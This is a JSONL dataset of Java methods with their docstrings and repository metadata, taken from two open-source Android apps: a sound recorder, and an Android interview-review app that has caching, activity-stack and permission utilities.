{"docstring": "/*\n * Called when MediaPlayer encounters an error.\n */\n", "func_signal": "public void onError(int error)", "code": "{\n    Resources res = getResources();\n\n    String message = null;\n    switch (error) {\n        case Recorder.STORAGE_ACCESS_ERROR:\n            message = res.getString(R.string.error_sdcard_access);\n            break;\n        case Recorder.IN_CALL_RECORD_ERROR:\n            // TODO: update error message to reflect that the recording\n            // could not be\n            // performed during a call.\n        case Recorder.INTERNAL_ERROR:\n            message = res.getString(R.string.error_app_internal);\n            break;\n    }\n    if (message != null) {\n        new AlertDialog.Builder(this).setTitle(R.string.app_name).setMessage(message)\n                .setPositiveButton(R.string.button_ok, null).setCancelable(false).show();\n    }\n}", "path": "src\\net\\micode\\soundrecorder\\SoundRecorder.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/**\n * Resets the recorder state. If a sample was recorded, the file is left on\n * disk and will be reused for a new recording.\n */\n", "func_signal": "public void clear()", "code": "{\n    stop();\n    mSampleLength = 0;\n    signalStateChanged(IDLE_STATE);\n}", "path": "src\\net\\micode\\soundrecorder\\Recorder.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/*\n * Handle the \"back\" hardware key.\n */\n", "func_signal": "@Override\npublic boolean onKeyDown(int keyCode, KeyEvent event)", "code": "{\n    if (keyCode == KeyEvent.KEYCODE_BACK) {\n        switch (mRecorder.state()) {\n            case Recorder.IDLE_STATE:\n            case Recorder.PLAYING_PAUSED_STATE:\n                if (mRecorder.sampleLength() > 0)\n                    saveSample();\n                finish();\n                break;\n            case Recorder.PLAYING_STATE:\n                mRecorder.stop();\n                saveSample();\n                break;\n            case Recorder.RECORDING_STATE:\n                if (mShowFinishButton) {\n                    mRecorder.clear();\n                } else {\n                    finish();\n                }\n                break;\n        }\n        return true;\n    } else {\n        return super.onKeyDown(keyCode, event);\n    }\n}", "path": "src\\net\\micode\\soundrecorder\\SoundRecorder.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/*\n * Registers an intent to listen for\n * ACTION_MEDIA_EJECT/ACTION_MEDIA_UNMOUNTED/ACTION_MEDIA_MOUNTED\n * notifications.\n */\n", "func_signal": "private void registerExternalStorageListener()", "code": "{\n    if (mSDCardMountEventReceiver == null) {\n        mSDCardMountEventReceiver = new BroadcastReceiver() {\n            @Override\n            public void onReceive(Context context, Intent intent) {\n                mSampleInterrupted = false;\n                mRecorder.reset();\n                resetFileNameEditText();\n                updateUi(false);\n            }\n        };\n        IntentFilter iFilter = new IntentFilter();\n        iFilter.addAction(Intent.ACTION_MEDIA_EJECT);\n        iFilter.addAction(Intent.ACTION_MEDIA_UNMOUNTED);\n        iFilter.addAction(Intent.ACTION_MEDIA_MOUNTED);\n        iFilter.addDataScheme(\"file\");\n        registerReceiver(mSDCardMountEventReceiver, iFilter);\n    }\n}", "path": "src\\net\\micode\\soundrecorder\\SoundRecorder.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/**\n * Update the big MM:SS timer. If we are in playback, also update the\n * progress bar.\n */\n", "func_signal": "private void updateTimerView()", "code": "{\n    int state = mRecorder.state();\n\n    boolean ongoing = state == Recorder.RECORDING_STATE || state == Recorder.PLAYING_STATE;\n\n    long time = mRecorder.progress();\n    String timeStr = String.format(mTimerFormat, time / 60, time % 60);\n    mTimerLayout.removeAllViews();\n    for (int i = 0; i < timeStr.length(); i++) {\n        mTimerLayout.addView(getTimerImage(timeStr.charAt(i)));\n    }\n\n    if (state == Recorder.RECORDING_STATE) {\n        updateTimeRemaining();\n    }\n\n    if (ongoing) {\n        mHandler.postDelayed(mUpdateTimer, 500);\n    }\n}", "path": "src\\net\\micode\\soundrecorder\\SoundRecorder.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/*\n * Called when we're in recording state. Find out how much longer we can go\n * on recording. If it's under 5 minutes, we display a count-down in the UI.\n * If we've run out of time, stop the recording.\n */\n", "func_signal": "private void updateTimeRemaining()", "code": "{\n    long t = mRemainingTimeCalculator.timeRemaining();\n\n    if (t <= 0) {\n        mSampleInterrupted = true;\n\n        int limit = mRemainingTimeCalculator.currentLowerLimit();\n        switch (limit) {\n            case RemainingTimeCalculator.DISK_SPACE_LIMIT:\n                mErrorUiMessage = getResources().getString(R.string.storage_is_full);\n                break;\n            case RemainingTimeCalculator.FILE_SIZE_LIMIT:\n                mErrorUiMessage = getResources().getString(R.string.max_length_reached);\n                break;\n            default:\n                mErrorUiMessage = null;\n                break;\n        }\n\n        mRecorder.stop();\n        return;\n    }\n}", "path": "src\\net\\micode\\soundrecorder\\SoundRecorder.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/*\n * Handle the buttons.\n */\n", "func_signal": "public void onClick(View button)", "code": "{\n    if (System.currentTimeMillis() - mLastClickTime < 300) {\n        // in order to avoid user click bottom too quickly\n        return;\n    }\n\n    if (!button.isEnabled())\n        return;\n\n    if (button.getId() == mLastButtonId && button.getId() != R.id.newButton) {\n        // as the recorder state is async with the UI\n        // we need to avoid launching the duplicated action\n        return;\n    }\n\n    if (button.getId() == R.id.stopButton && System.currentTimeMillis() - mLastClickTime < 1500) {\n        // it seems that the media recorder is not robust enough\n        // sometime it crashes when stop recording right after starting\n        return;\n    }\n\n    mLastClickTime = System.currentTimeMillis();\n    mLastButtonId = button.getId();\n\n    switch (button.getId()) {\n        case R.id.newButton:\n            mFileNameEditText.clearFocus();\n            saveSample();\n            mRecorder.reset();\n            resetFileNameEditText();\n            break;\n        case R.id.recordButton:\n            showOverwriteConfirmDialogIfConflicts();\n            break;\n        case R.id.stopButton:\n            mRecorder.stop();\n            break;\n        case R.id.playButton:\n            mRecorder.startPlayback(mRecorder.playProgress());\n            break;\n        case R.id.pauseButton:\n            mRecorder.pausePlayback();\n            break;\n        case R.id.finishButton:\n            mRecorder.stop();\n            saveSample();\n            finish();\n            break;\n        case R.id.deleteButton:\n            showDeleteConfirmDialog();\n            break;\n    }\n}", "path": "src\\net\\micode\\soundrecorder\\SoundRecorder.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/**\n * If called, the calculator will return the minimum of two estimates: how\n * long until we run out of disk space and how long until the file reaches\n * the specified size.\n *\n * @param file the file to watch\n * @param maxBytes the limit\n */\n", "func_signal": "public void setFileSizeLimit(File file, long maxBytes)", "code": "{\n    mRecordingFile = file;\n    mMaxBytes = maxBytes;\n}", "path": "src\\net\\micode\\soundrecorder\\RemainingTimeCalculator.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/**\n * Resets the recorder state. If a sample was recorded, the file is deleted.\n */\n", "func_signal": "public void delete()", "code": "{\n    stop();\n\n    if (mSampleFile != null)\n        mSampleFile.delete();\n\n    mSampleFile = null;\n    mSampleLength = 0;\n\n    signalStateChanged(IDLE_STATE);\n}", "path": "src\\net\\micode\\soundrecorder\\Recorder.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/*\n * Called when Recorder changed it's state.\n */\n", "func_signal": "public void onStateChanged(int state)", "code": "{\n    if (state == Recorder.PLAYING_STATE || state == Recorder.RECORDING_STATE) {\n        mSampleInterrupted = false;\n        mErrorUiMessage = null;\n    }\n\n    updateUi(false);\n}", "path": "src\\net\\micode\\soundrecorder\\SoundRecorder.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/*\n * If we have just recorded a sample, this adds it to the media data base\n * and sets the result to the sample's URI.\n */\n", "func_signal": "private void saveSample()", "code": "{\n    if (mRecorder.sampleLength() == 0)\n        return;\n    if (!mSavedRecord.contains(mRecorder.sampleFile().getAbsolutePath())) {\n        Uri uri = null;\n        try {\n            uri = this.addToMediaDB(mRecorder.sampleFile());\n        } catch (UnsupportedOperationException ex) { // Database\n            // manipulation\n            // failure\n            return;\n        }\n        if (uri == null) {\n            return;\n        }\n        mSavedRecord.add(mRecorder.sampleFile().getAbsolutePath());\n        setResult(RESULT_OK, new Intent().setData(uri));\n    }\n}", "path": "src\\net\\micode\\soundrecorder\\SoundRecorder.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/*\n * Called on destroy to unregister the SD card mount event receiver.\n */\n", "func_signal": "@Override\npublic void onDestroy()", "code": "{\n    if (mSDCardMountEventReceiver != null) {\n        unregisterReceiver(mSDCardMountEventReceiver);\n        mSDCardMountEventReceiver = null;\n    }\n    mSoundPool.release();\n\n    super.onDestroy();\n}", "path": "src\\net\\micode\\soundrecorder\\SoundRecorder.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/**\n * Resets the interpolation.\n */\n", "func_signal": "public void reset()", "code": "{\n    mCurrentLowerLimit = UNKNOWN_LIMIT;\n    mBlocksChangedTime = -1;\n    mFileSizeChangedTime = -1;\n}", "path": "src\\net\\micode\\soundrecorder\\RemainingTimeCalculator.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/*\n * Make sure we're not recording music playing in the background, ask the\n * MediaPlaybackService to pause playback.\n */\n", "func_signal": "private void stopAudioPlayback()", "code": "{\n    // Shamelessly copied from MediaPlaybackService.java, which\n    // should be public, but isn't.\n    Intent i = new Intent(\"com.android.music.musicservicecommand\");\n    i.putExtra(\"command\", \"pause\");\n\n    sendBroadcast(i);\n}", "path": "src\\net\\micode\\soundrecorder\\SoundRecorder.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/*\n * Add the given audioId to the playlist with the given playlistId; and\n * maintain the play_order in the playlist.\n */\n", "func_signal": "private void addToPlaylist(ContentResolver resolver, int audioId, long playlistId)", "code": "{\n    String[] cols = new String[] {\n        \"count(*)\"\n    };\n    Uri uri = MediaStore.Audio.Playlists.Members.getContentUri(\"external\", playlistId);\n    Cursor cur = resolver.query(uri, cols, null, null, null);\n    cur.moveToFirst();\n    final int base = cur.getInt(0);\n    cur.close();\n    ContentValues values = new ContentValues();\n    values.put(MediaStore.Audio.Playlists.Members.PLAY_ORDER, Integer.valueOf(base + audioId));\n    values.put(MediaStore.Audio.Playlists.Members.AUDIO_ID, audioId);\n    resolver.insert(uri, values);\n}", "path": "src\\net\\micode\\soundrecorder\\SoundRecorder.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/**\n * Shows/hides the appropriate child views for the new state.\n */\n", "func_signal": "private void updateUi(boolean skipRewindAnimation)", "code": "{\n    switch (mRecorder.state()) {\n        case Recorder.IDLE_STATE:\n            mLastButtonId = 0;\n        case Recorder.PLAYING_PAUSED_STATE:\n            if (mRecorder.sampleLength() == 0) {\n                mNewButton.setEnabled(true);\n                mNewButton.setVisibility(View.VISIBLE);\n                mRecordButton.setVisibility(View.VISIBLE);\n                mStopButton.setVisibility(View.GONE);\n                mPlayButton.setVisibility(View.GONE);\n                mPauseButton.setVisibility(View.GONE);\n                mDeleteButton.setEnabled(false);\n                mRecordButton.requestFocus();\n\n                mVUMeterLayout.setVisibility(View.VISIBLE);\n                mSeekBarLayout.setVisibility(View.GONE);\n            } else {\n                mNewButton.setEnabled(true);\n                mNewButton.setVisibility(View.VISIBLE);\n                mRecordButton.setVisibility(View.GONE);\n                mStopButton.setVisibility(View.GONE);\n                mPlayButton.setVisibility(View.VISIBLE);\n                mPauseButton.setVisibility(View.GONE);\n                mDeleteButton.setEnabled(true);\n                mPauseButton.requestFocus();\n\n                mVUMeterLayout.setVisibility(View.GONE);\n                mSeekBarLayout.setVisibility(View.VISIBLE);\n                mStartTime.setText(String.format(mTimerFormat, 0, 0));\n                mTotalTime.setText(String.format(mTimerFormat, mRecorder.sampleLength() / 60,\n                        mRecorder.sampleLength() % 60));\n            }\n            mFileNameEditText.setEnabled(true);\n            mFileNameEditText.clearFocus();\n\n            if (mRecorder.sampleLength() > 0) {\n                if (mRecorder.state() == Recorder.PLAYING_PAUSED_STATE) {\n                    stopAnimation();\n                    if (SoundRecorderPreferenceActivity.isEnabledSoundEffect(this)) {\n                        mSoundPool.play(mPauseSound, 1.0f, 1.0f, 0, 0, 1);\n                    }\n                } else {\n                    mPlaySeekBar.setProgress(0);\n                    if (!skipRewindAnimation) {\n                        stopRecordPlayingAnimation();\n                    } else {\n                        stopAnimation();\n                    }\n                }\n            } else {\n                stopAnimation();\n            }\n\n            // we allow only one toast at one time\n            if (mSampleInterrupted && mErrorUiMessage == null) {\n                Toast.makeText(this, R.string.recording_stopped, Toast.LENGTH_SHORT).show();\n            }\n\n            if (mErrorUiMessage != null) {\n                Toast.makeText(this, mErrorUiMessage, Toast.LENGTH_SHORT).show();\n            }\n\n            break;\n        case Recorder.RECORDING_STATE:\n            mNewButton.setEnabled(false);\n            mNewButton.setVisibility(View.VISIBLE);\n            mRecordButton.setVisibility(View.GONE);\n            mStopButton.setVisibility(View.VISIBLE);\n            mPlayButton.setVisibility(View.GONE);\n            mPauseButton.setVisibility(View.GONE);\n            mDeleteButton.setEnabled(false);\n            mStopButton.requestFocus();\n\n            mVUMeterLayout.setVisibility(View.VISIBLE);\n            mSeekBarLayout.setVisibility(View.GONE);\n\n            mFileNameEditText.setEnabled(false);\n\n            startRecordPlayingAnimation();\n            mPreviousVUMax = 0;\n            break;\n\n        case Recorder.PLAYING_STATE:\n            mNewButton.setEnabled(false);\n            mNewButton.setVisibility(View.VISIBLE);\n            mRecordButton.setVisibility(View.GONE);\n            mStopButton.setVisibility(View.GONE);\n            mPlayButton.setVisibility(View.GONE);\n            mPauseButton.setVisibility(View.VISIBLE);\n            mDeleteButton.setEnabled(false);\n            mPauseButton.requestFocus();\n\n            mVUMeterLayout.setVisibility(View.GONE);\n            mSeekBarLayout.setVisibility(View.VISIBLE);\n\n            mFileNameEditText.setEnabled(false);\n\n            if (SoundRecorderPreferenceActivity.isEnabledSoundEffect(this)) {\n                mSoundPool.play(mPlaySound, 1.0f, 1.0f, 0, 0, 1);\n            }\n            startRecordPlayingAnimation();\n            break;\n    }\n\n    updateTimerView();\n    updateSeekBar();\n    updateVUMeterView();\n\n}", "path": "src\\net\\micode\\soundrecorder\\SoundRecorder.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/**\n * Is there any point of trying to start recording?\n */\n", "func_signal": "public boolean diskSpaceAvailable()", "code": "{\n    StatFs fs = new StatFs(Environment.getExternalStorageDirectory().getAbsolutePath());\n    // keep one free block\n    return fs.getAvailableBlocks() > EXTERNAL_STORAGE_BLOCK_THREADHOLD;\n}", "path": "src\\net\\micode\\soundrecorder\\RemainingTimeCalculator.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "/**\n * Returns how long (in seconds) we can continue recording.\n */\n", "func_signal": "public long timeRemaining()", "code": "{\n    // Calculate how long we can record based on free disk space\n    StatFs fs = null;\n    long blocks = -1;\n    long blockSize = -1;\n    long now = System.currentTimeMillis();\n\n    fs = new StatFs(Environment.getExternalStorageDirectory().getAbsolutePath());\n    blocks = fs.getAvailableBlocks() - EXTERNAL_STORAGE_BLOCK_THREADHOLD;\n    blockSize = fs.getBlockSize();\n    if (blocks < 0) {\n        blocks = 0;\n    }\n\n    if (mBlocksChangedTime == -1 || blocks != mLastBlocks) {\n        mBlocksChangedTime = now;\n        mLastBlocks = blocks;\n    }\n\n    /*\n     * The calculation below always leaves one free block, since free space\n     * in the block we're currently writing to is not added. This last block\n     * might get nibbled when we close and flush the file, but we won't run\n     * out of disk.\n     */\n\n    // at mBlocksChangedTime we had this much time\n    long result = mLastBlocks * blockSize / mBytesPerSecond;\n    // so now we have this much time\n    result -= (now - mBlocksChangedTime) / 1000;\n\n    if (mRecordingFile == null) {\n        mCurrentLowerLimit = DISK_SPACE_LIMIT;\n        return result;\n    }\n\n    // If we have a recording file set, we calculate a second estimate\n    // based on how long it will take us to reach mMaxBytes.\n\n    mRecordingFile = new File(mRecordingFile.getAbsolutePath());\n    long fileSize = mRecordingFile.length();\n    if (mFileSizeChangedTime == -1 || fileSize != mLastFileSize) {\n        mFileSizeChangedTime = now;\n        mLastFileSize = fileSize;\n    }\n\n    long result2 = (mMaxBytes - fileSize) / mBytesPerSecond;\n    result2 -= (now - mFileSizeChangedTime) / 1000;\n    result2 -= 1; // just for safety\n\n    mCurrentLowerLimit = result < result2 ? DISK_SPACE_LIMIT : FILE_SIZE_LIMIT;\n\n    return Math.min(result, result2);\n}", "path": "src\\net\\micode\\soundrecorder\\RemainingTimeCalculator.java", "repo_name": "MiCode/SoundRecorder", "stars": 604, "license": "None", "language": "java", "size": 579}
{"docstring": "// \u5224\u65ad\u6743\u9650\u96c6\u5408\n", "func_signal": "public boolean lacksPermissions(String... permissions)", "code": "{\n    for (String permission : permissions) {\n        if (lacksPermission(permission)) {\n            return true;\n        }\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\utils\\PermissionsChecker.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\n * \u5806\u6808\u4e2d\u79fb\u9664Activity\n */\n", "func_signal": "public void removeActivity(Activity activity)", "code": "{\n    if (activityStack == null) {\n       return;\n    }else if(activityStack.contains(activity)){\n        activityStack.remove(activity);\n    }\n\n    if (activity != null && !activity.isFinishing()) {\n        activity.finish();\n        activity = null;\n    }\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\base\\system\\AppManager.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\n * \u7ed3\u675f\u5f53\u524dActivity\uff08\u5806\u6808\u4e2d\u6700\u540e\u4e00\u4e2a\u538b\u5165\u7684\uff09\n */\n", "func_signal": "public void finishActivity()", "code": "{\n    Activity activity = activityStack.lastElement();\n    finishActivity(activity);\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\base\\system\\AppManager.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "// \u6743\u9650\u68c0\u6d4b\u5668\n", "func_signal": "@Override\n   protected void onCreate(Bundle savedInstanceState)", "code": "{\n       super.onCreate(savedInstanceState);\n\n       // \u9632\u6b62\u7b2c\u4e09\u65b9\u8df3\u8f6c\u65f6\u51fa\u73b0\u53cc\u5b9e\u4f8b\n       Activity aty = AppManager.getActivity(MainActivity.class);\n       if (aty != null && !aty.isFinishing()) {\n           finish();\n       }\n       setContentView(R.layout.activity_app_start);\n\n       mPermissionsChecker = new PermissionsChecker(this);\n\n   }", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\ui\\activites\\AppStartActivity.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\n * \u201c\u5355\u5143\u201d\u5217\u8868\u4e0b\u62c9\u5237\u65b0\u5177\u4f53\u5b9e\u73b0\n */\n", "func_signal": "private void putToRefreshByUnit()", "code": "{\n    //\u521d\u59cb\u5316Bmob\u67e5\u8be2\u7c7b\n    BmobQuery<Unit> query = new BmobQuery<>();\n    //\u6267\u884c\u67e5\u8be2\uff0c\u67e5\u8be2\u5355\u5143\u8868 \u53d6\u51fa\u6240\u6709\u5355\u5143\n    query.findObjects(getContext(), new FindListener<Unit>() {\n        @Override\n        public void onSuccess(final List<Unit> unitList) {\n            //\u6839\u636e\u67e5\u8be2\u7684\u6240\u6709\u5355\u5143\uff0c\u8bf7\u6c42\u6240\u6709\u7684\u77e5\u8bc6\u70b9\u6570\u636e\n            requestPointByUnits(unitList);\n        }\n        @Override\n        public void onError(int i, String s) {\n            toastError(mLoadingLayout, getContext());\n        }\n    });\n\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\ui\\fragment\\ReviewFragment.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\n * \u8bfb\u53d6\u7f13\u5b58\n *\n * @param cacheKey\n */\n", "func_signal": "private void readCache(String cacheKey)", "code": "{\n    ReadCacheAsyncTask<List<Map<String, List<Point>>>> readCache = new ReadCacheAsyncTask<>(getContext());\n    readCache.setOnReadCacheToDo(new ReadCacheAsyncTask.OnReadCacheToDo<List<Map<String, List<Point>>>>() {\n        @Override\n        public void preExecute() {\n            mLoadingLayout.setLoadingLayout(LoadingLayout.NETWORK_LOADING);\n            mPtrFrameLayout.setVisibility(View.GONE);\n        }\n\n        @Override\n        public void postExectue(List<Map<String, List<Point>>> data) {\n            if (data == null || data.size() == 0) {\n                mLoadingLayout.setLoadingLayout(LoadingLayout.NETWORK_REFRESH);\n                mPtrFrameLayout.autoRefresh(true);\n            } else {\n                mLoadingLayout.setLoadingLayout(LoadingLayout.HIDE_LAYOUT);\n                mPtrFrameLayout.setVisibility(View.VISIBLE);\n                mReviewListAdapter.setDatas(data);\n            }\n\n        }\n    });\n\n    readCache.execute(cacheKey);\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\ui\\fragment\\ReviewFragment.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\n * Measures width according to the passed measure spec\n *\n * @param measureSpec int measure spec to use\n * @return int pixel size\n */\n", "func_signal": "private int measureWidth(int measureSpec)", "code": "{\n    int specMode = MeasureSpec.getMode(measureSpec);\n    int specSize = MeasureSpec.getSize(measureSpec);\n    int result;\n    if (specMode == MeasureSpec.EXACTLY) {\n        result = specSize;\n    } else {\n        result = specSize + getPaddingLeft() + getPaddingRight() + (2 * DEFAULT_PAINT_STROKE_WIDTH) + (int) (2 * radius);\n        if (specMode == MeasureSpec.AT_MOST) {\n            result = Math.min(result, specSize);\n        }\n    }\n    return result;\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\ui\\view\\RangeSliderViewEx.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\u8fd4\u56de\u5f53\u524dActivity\u6808\u4e2dActivity\u7684\u6570\u91cf\n * @return\n */\n", "func_signal": "public int getActivityCount()", "code": "{\n    int count = activityStack.size();\n    return count;\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\base\\system\\AppManager.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\n * \u83b7\u53d6\u5f53\u524dActivity\uff08\u5806\u6808\u4e2d\u6700\u540e\u4e00\u4e2a\u538b\u5165\u7684\uff09\n */\n", "func_signal": "public Activity currentActivity()", "code": "{\n    Activity activity = activityStack.lastElement();\n    return activity;\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\base\\system\\AppManager.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\n * Perform all the calculation before drawing, should only run once\n */\n", "func_signal": "private void preComputeDrawingPosition()", "code": "{\n    int w = getWidthWithPadding();\n    int h = getHeightWithPadding();\n\n    /** Space between each slot */\n    int spacing = w / rangeCount;\n\n    /** Center vertical */\n    int y = getPaddingTop() + h / 2;\n    currentSlidingY = y;\n    selectedSlotY = y;\n    /**\n     * Try to center it, so start by half\n     * <pre>\n     *\n     *  Example for 4 slots\n     *\n     *  ____o____|____o____|____o____|____o____\n     *  --space--\n     *\n     * </pre>\n     */\n    int x = getPaddingLeft() + (spacing / 2);\n\n    /** Store the position of each slot index */\n    for (int i = 0; i < rangeCount; ++i) {\n        slotPositions[i] = x;\n        if (i == currentIndex) {\n            currentSlidingX = x;\n            selectedSlotX = x;\n        }\n        x += spacing;\n    }\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\ui\\view\\RangeSliderViewEx.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\n * \u7ed3\u675f\u6307\u5b9a\u7684Activity\n */\n", "func_signal": "public void finishActivity(Activity activity)", "code": "{\n    if (activity != null && !activity.isFinishing()) {\n        activityStack.remove(activity);\n        activity.finish();\n        activity = null;\n    }\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\base\\system\\AppManager.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\n * \u5224\u65ad\u7f13\u5b58\u662f\u5426\u5df2\u7ecf\u5931\u6548\n */\n", "func_signal": "public static boolean isCacheDataFailure(Context context, String cachefile)", "code": "{\n    File data = context.getFileStreamPath(cachefile);\n    if (!data.exists()) {\n\n        return false;\n    }\n    long existTime = System.currentTimeMillis() - data.lastModified();\n    boolean failure = false;\n    if (TDevice.getNetworkType() == TDevice.NETTYPE_WIFI) {\n        failure = existTime > Settings.getInt(Settings.CACHE_OVERTIME_WIFI,30) * 60 * 1000 ? true : false;\n    } else {\n        failure = existTime > Settings.getInt(Settings.CACHE_OVERTIME_OTHER,2) * 24 * 60 * 60 * 1000 ? true : false;\n    }\n    return failure;\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\cache\\CacheHelper.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\n * \u9000\u51fa\u5e94\u7528\u7a0b\u5e8f\n */\n", "func_signal": "public void AppExit(Context context)", "code": "{\n    try {\n        finishAllActivity();\n        // \u6740\u6b7b\u8be5\u5e94\u7528\u8fdb\u7a0b\n        android.os.Process.killProcess(android.os.Process.myPid());\n        System.exit(0);\n    } catch (Exception e) {\n    }\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\base\\system\\AppManager.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\n * \u8df3\u8f6c\u5230\u4e3bActivity\n */\n", "func_signal": "private void redirectTo()", "code": "{\n    Intent intent = new Intent(this, MainActivity.class);\n    startActivity(intent);\n    finish();\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\ui\\activites\\AppStartActivity.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\n * \u4fdd\u5b58\u5bf9\u8c61\n *\n * @param ser\n * @param file\n * @throws IOException\n */\n", "func_signal": "public static boolean saveObject(Context context, Serializable ser,\n                                 String file)", "code": "{\n    FileOutputStream fos = null;\n    ObjectOutputStream oos = null;\n    try {\n        fos = context.openFileOutput(file, Context.MODE_PRIVATE);\n        oos = new ObjectOutputStream(fos);\n        oos.writeObject(ser);\n        oos.flush();\n        return true;\n    } catch (Exception e) {\n        e.printStackTrace();\n        return false;\n    } finally {\n        try {\n            oos.close();\n        } catch (Exception e) {\n        }\n        try {\n            fos.close();\n        } catch (Exception e) {\n        }\n    }\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\cache\\CacheHelper.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\n * \u6dfb\u52a0Activity\u5230\u5806\u6808\n */\n", "func_signal": "public void addActivity(Activity activity)", "code": "{\n    if (activityStack == null) {\n        activityStack = new Stack<Activity>();\n    }\n    activityStack.add(activity);\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\base\\system\\AppManager.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\n * \u8bfb\u53d6\u5bf9\u8c61\n *\n * @param file\n * @return\n * @throws IOException\n */\n", "func_signal": "public static Serializable readObject(Context context, String file)", "code": "{\n    if (!isExistDataCache(context, file))\n        return null;\n    FileInputStream fis = null;\n    ObjectInputStream ois = null;\n    try {\n        fis = context.openFileInput(file);\n        ois = new ObjectInputStream(fis);\n        return (Serializable) ois.readObject();\n    } catch (FileNotFoundException e) {\n    } catch (Exception e) {\n        e.printStackTrace();\n        // \u53cd\u5e8f\u5217\u5316\u5931\u8d25 - \u5220\u9664\u7f13\u5b58\u6587\u4ef6\n        if (e instanceof InvalidClassException) {\n            File data = context.getFileStreamPath(file);\n            data.delete();\n        }\n    } finally {\n        try {\n            ois.close();\n        } catch (Exception e) {\n        }\n        try {\n            fis.close();\n        } catch (Exception e) {\n        }\n    }\n    return null;\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\cache\\CacheHelper.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
{"docstring": "/**\n * \u5224\u65ad\u7f13\u5b58\u662f\u5426\u5b58\u5728\n *\n * @param cachefile\n * @return\n */\n", "func_signal": "public static boolean isExistDataCache(Context context, String cachefile)", "code": "{\n    if (context == null)\n        return false;\n    boolean exist = false;\n    File data = context.getFileStreamPath(cachefile);\n    if (data.exists())\n        exist = true;\n    return exist;\n}", "path": "app\\src\\main\\java\\com\\vv\\androidreview\\cache\\CacheHelper.java", "repo_name": "envyfan/AndroidReview", "stars": 715, "license": "gpl-3.0", "language": "java", "size": 8850}
